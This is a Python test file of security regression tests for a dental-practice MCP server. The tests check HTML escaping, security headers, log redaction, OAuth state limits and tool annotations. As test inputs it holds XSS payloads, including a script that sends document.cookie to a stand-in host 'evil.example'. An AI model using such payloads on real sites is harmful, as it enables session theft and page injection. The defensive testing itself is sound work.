"""Regression tests for the security review.

Each test names the hole it keeps shut. They are grouped by the thing an attacker
would actually try, not by module.
"""
from __future__ import annotations

import pytest
from starlette.applications import Starlette
from starlette.testclient import TestClient

from dentally_mcp import audit, config, http_api, surfaces
from dentally_mcp.server import build


def _client():
    return TestClient(Starlette(routes=http_api.routes()))


# --- reflected XSS on the unauthenticated callback ---------------------------
def test_callback_error_is_escaped():
    """`?error=` was interpolated raw into HTML on an endpoint with no auth."""
    payload = "<script>fetch('//evil.example/'+document.cookie)</script>"
    body = _client().get("/auth/callback", params={"error": payload}).text
    assert "<script>fetch" not in body
    assert "&lt;script&gt;" in body


@pytest.mark.parametrize("payload", [
    '"><img src=x onerror=alert(1)>',
    "</p><svg onload=alert(1)>",
    "' onmouseover='alert(1)",
    "</p></body></html><h1>Enter your password",
])
# Deliberately NOT tested here: a bare `javascript:alert(1)`. It renders as inert
# text because these pages never put untrusted input in an href or src, so asserting
# it is absent would be testing a vector that does not exist in this code.
def test_callback_escapes_other_break_out_attempts(payload):
    """What matters is that the payload cannot LEAVE the text node.

    `onerror=` surviving as literal text is harmless once the angle brackets and
    quotes are escaped — so assert on the structure (no raw `<`, `>` or `"` from the
    payload reaches the document) rather than on scary-looking substrings.
    """
    body = _client().get("/auth/callback", params={"error": payload}).text
    rendered = body.split("<p>")[1].split("</p>")[0]
    for raw in ("<", ">", '"'):
        assert raw not in rendered, f"{raw!r} escaped the text node: {rendered}"
    assert payload not in body


def test_a_practice_name_from_dentally_cannot_inject_html(monkeypatch):
    """Upstream data is untrusted too, even from a system we authenticated to."""
    from dentally_mcp.tokenstore import PracticeToken

    async def fake_exchange(code, state):
        return PracticeToken(practice_id="p1", access_token="x",
                             practice_name="<script>alert(1)</script>")

    monkeypatch.setattr(http_api.FLOW, "exchange", fake_exchange)
    body = _client().get("/auth/callback", params={"code": "c", "state": "s"}).text
    assert "<script>alert" not in body
    assert "&lt;script&gt;" in body


def test_html_pages_carry_a_content_security_policy():
    for path in ("/connect", "/auth/callback?error=x"):
        resp = _client().get(path)
        csp = resp.headers.get("content-security-policy", "")
        assert "default-src 'none'" in csp, path
        assert "frame-ancestors 'none'" in csp, path
        assert resp.headers.get("x-content-type-options") == "nosniff", path
        # The connect page holds two live credentials; a cache must not keep it.
        assert resp.headers.get("cache-control") == "no-store", path


# --- upstream response bodies must not reach the caller ----------------------
def test_error_responses_do_not_echo_the_upstream_body(monkeypatch):
    """A 422 from Dentally echoes back what we submitted — for register_patient
    that is a patient's name and date of birth."""
    from dentally_mcp.errors import ValidationError

    async def fake_identify(token):
        raise ValidationError("rejected", status=422,
                              detail={"first_name": "Jane", "date_of_birth": "1984-03-11"})

    monkeypatch.setattr(config, "CLIENT_AUTH_TOKEN", "admin")
    monkeypatch.setattr(http_api.FLOW, "identify", fake_identify)
    resp = _client().post("/auth/validate", json={"token": "t"},
                          headers={"Authorization": "Bearer admin"})
    assert "Jane" not in resp.text
    assert "1984-03-11" not in resp.text
    assert "detail" not in resp.json()


# --- reconnaissance ----------------------------------------------------------
def test_healthz_tells_an_anonymous_caller_almost_nothing(monkeypatch):
    monkeypatch.setattr(config, "CLIENT_AUTH_TOKEN", "admin")
    body = _client().get("/healthz").json()
    assert body["status"] == "ok"
    # Whether writes are on and how many practices are connected together describe
    # how rewarding an attack would be.
    for leaky in ("writes_enabled", "practices_connected", "api_base", "auth_mode"):
        assert leaky not in body, leaky


def test_healthz_still_gives_operators_the_detail(monkeypatch):
    monkeypatch.setattr(config, "CLIENT_AUTH_TOKEN", "admin")
    body = _client().get("/healthz", headers={"Authorization": "Bearer admin"}).json()
    assert "writes_enabled" in body and "api_base" in body


def test_demo_flag_stays_public():
    """Mistaking synthetic data for a real diary is the failure this prevents, so
    it must be visible without a credential."""
    assert "demo_mode" in _client().get("/healthz").json()


# --- denial of service on the unauthenticated login endpoint -----------------
def test_pending_oauth_states_are_capped(monkeypatch):
    """/auth/login must stay unauthenticated, so it must not let anyone grow an
    unbounded dict that lives for ten minutes."""
    from dentally_mcp.oauth import MAX_PENDING_STATES, OAuthFlow
    from dentally_mcp.tokenstore import TokenStore

    monkeypatch.setattr(config, "CLIENT_ID", "cid")
    monkeypatch.setattr(config, "REDIRECT_URI", "https://example.com/cb")
    flow = OAuthFlow(TokenStore("/tmp/never-written.enc"))

    for _ in range(MAX_PENDING_STATES + 50):
        flow.authorize_url()
    assert flow.pending_count <= MAX_PENDING_STATES


def test_a_flood_does_not_lock_out_a_real_login(monkeypatch):
    """Evict the oldest rather than refuse — otherwise the flood IS the outage."""
    from dentally_mcp.oauth import MAX_PENDING_STATES, OAuthFlow
    from dentally_mcp.tokenstore import TokenStore

    monkeypatch.setattr(config, "CLIENT_ID", "cid")
    monkeypatch.setattr(config, "REDIRECT_URI", "https://example.com/cb")
    flow = OAuthFlow(TokenStore("/tmp/never-written.enc"))
    for _ in range(MAX_PENDING_STATES):
        flow.authorize_url()

    url, state = flow.authorize_url()          # must still succeed
    assert state and "client_id=cid" in url


# --- the audit log must not become a second patient database -----------------
def test_a_search_term_is_not_written_to_the_audit_log():
    """`search_patients(query="Jane Doe")` used to log the name verbatim, while
    this module's own docstring promised patient names were never recorded."""
    out = audit._safe_args({"query": "Jane Doe", "patient_id": "9001", "limit": 10})
    assert "Jane Doe" not in str(out)
    assert out["query"].startswith("sha256:")
    assert out["patient_id"] == "9001", "identifiers stay readable for investigations"
    assert out["limit"] == 10


def test_contact_details_and_notes_are_not_logged_verbatim():
    out = audit._safe_args({
        "first_name": "Jane", "last_name": "Doe", "date_of_birth": "1984-03-11",
        "email": "jane@example.com", "notes": "ring her about the crown",
    })
    blob = str(out)
    for secret in ("Jane", "Doe", "jane@example.com", "ring her"):
        assert secret not in blob, secret


def test_an_unrecognised_argument_is_hashed_not_logged():
    """Allow-list, not deny-list: an argument added next year must be safe by
    default rather than leak until someone notices."""
    out = audit._safe_args({"some_future_field": "Jane Doe's home address"})
    assert out["some_future_field"].startswith("sha256:")


def test_the_same_term_hashes_the_same_way():
    """The digest still has to answer 'was this the same search, twice?'."""
    a = audit._safe_args({"query": "Doe"})["query"]
    b = audit._safe_args({"query": "Doe"})["query"]
    assert a == b and a != audit._safe_args({"query": "Roe"})["query"]


def test_credentials_are_still_redacted_outright():
    out = audit._safe_args({"api_token": "super-secret", "authorization": "Bearer x"})
    assert out["api_token"] == "[redacted]"
    assert "super-secret" not in str(out)


# --- tokens at rest ----------------------------------------------------------
def test_the_token_file_is_never_world_readable_even_briefly(tmp_path):
    """Write-then-chmod left a window under the process umask where anything on the
    box could read the file."""
    pytest.importorskip("cryptography")
    from cryptography.fernet import Fernet

    from dentally_mcp.tokenstore import PracticeToken, TokenStore

    path = tmp_path / "t.enc"
    store = TokenStore(path, Fernet.generate_key().decode())
    store.put(PracticeToken(practice_id="p1", access_token="x"))
    assert (path.stat().st_mode & 0o777) == 0o600
    assert not list(tmp_path.glob("*.tmp")), "the temp file must not be left behind"


# --- tool annotations (M8ven finding) ----------------------------------------
async def test_every_tool_declares_all_four_hints_as_booleans():
    """A host that cannot tell a read from a write has to warn on everything or
    nothing. OpenAI's directory rejects a tool missing any of the four."""
    mcp = build()
    for tool in mcp._tool_manager.list_tools():
        ann = tool.annotations
        assert ann is not None, f"{tool.name} has no annotations"
        for hint in ("readOnlyHint", "destructiveHint", "idempotentHint", "openWorldHint"):
            assert isinstance(getattr(ann, hint), bool), f"{tool.name}.{hint} is not a bool"


async def test_the_read_only_hint_matches_the_write_gate_exactly():
    """The hint a host shows the user and the gate that actually enforces writes
    must never drift apart."""
    mcp = build()
    declared_writes = {t.name for t in mcp._tool_manager.list_tools()
                       if t.annotations.readOnlyHint is False}
    assert declared_writes == surfaces.WRITE_TOOLS


async def test_creates_are_not_idempotent_and_updates_are():
    """Booking twice makes two appointments; cancelling twice leaves one cancelled."""
    mcp = build()
    by_name = {t.name: t.annotations for t in mcp._tool_manager.list_tools()}
    assert by_name["book_appointment"].idempotentHint is False
    assert by_name["register_patient"].idempotentHint is False
    assert by_name["cancel_appointment"].idempotentHint is True
    assert by_name["reschedule_appointment"].destructiveHint is True
    assert by_name["book_appointment"].destructiveHint is False


async def test_every_tool_is_open_world():
    """All 25 call the Dentally API; none is a pure local computation."""
    mcp = build()
    assert all(t.annotations.openWorldHint is True for t in mcp._tool_manager.list_tools())


def test_the_annotation_table_covers_every_write_tool():
    """A write tool missing from the table would raise KeyError at registration."""
    assert set(surfaces._WRITE_ANNOTATIONS) == surfaces.WRITE_TOOLS
